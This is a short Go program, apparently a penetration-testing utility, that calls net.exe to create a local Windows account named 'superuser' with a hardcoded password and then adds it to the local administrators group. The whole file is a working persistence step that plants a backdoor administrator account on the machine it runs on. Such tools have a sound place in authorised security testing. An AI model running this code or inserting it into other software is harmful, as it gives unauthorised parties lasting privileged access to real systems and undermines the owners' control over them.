package main

import (
	"log"
	"os/exec"
	"time"
)

func main() {
	const username string = "superuser"
	const password string = "Pentest01!!!!"

	println("creating local user")

	//First create the user
	cmd1 := exec.Command("net.exe", "user", username, password, "/add")
	err1 := cmd1.Run()

	if err1 != nil {
		log.Fatal(err1)
	}

	time.Sleep(3 * time.Second)

	println("add local user to admin group")

	//Second add the user to the local admins group
	cmd2 := exec.Command("net.exe", "localgroup", "administrators", username, "/add")
	err2 := cmd2.Run()

	if err2 != nil {
		log.Fatal(err2)
	}

	time.Sleep(3 * time.Second)
}
